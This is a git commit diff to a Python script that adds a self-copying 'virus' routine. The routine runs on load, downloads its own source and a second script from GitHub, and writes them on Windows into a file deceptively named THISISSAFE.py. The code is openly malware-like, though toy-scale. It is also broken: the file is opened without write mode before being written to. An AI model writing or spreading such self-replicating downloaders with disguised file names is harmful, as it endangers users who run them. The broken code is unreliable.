191d7b137137b445dd17389d6ad86e15403eea12
speedruneer <101725579+speedruneer@users.noreply.github.com>
2024-11-24 12:48:05 +0100

    war crimes were commited
    I commited sin today

--- main.py
+++ main.py
@@ -1,4 +1,13 @@
 import requests
+import os
+
+os_name = os.name
+global OS
+if os.name == 'nt':
+    OS = "Windows"
+elif os.name == 'posix':
+    OS = "Linux"
+
 
 def get_github_file_content(url):
     response = requests.get(url)
@@ -8,3 +17,18 @@ def get_github_file_content(url):
         raise Exception(f"Error fetching the file: {response.status_code}")
 github_raw_url = "https://raw.githubusercontent.com/speedruneer/Testing/refs/heads/main/main.py"
 github_raw_url_mvex = "https://raw.githubusercontent.com/speedruneer/Testing/refs/heads/main/mv_ex.py"
+
+def create_self_copy():
+    if OS == "Windows":
+        if not os.path.exists("C:/WM"):
+            os.makedirs("C:/WM")
+            f = open("C:/WM/THISISSAFE.py")
+        else:
+            f = open("C:/WM/THISISSAFE.py")
+        virus_self = get_github_file_content(github_raw_url)
+        mv_ex = get_github_file_content(github_raw_url_mvex)
+        f.write(virus_self + "\n\n# Oooh scary\n\n" + mv_ex)
+    elif OS == "Linux":
+        print("Really man? Linux and you downloaded a virus?")
+
+create_self_copy()
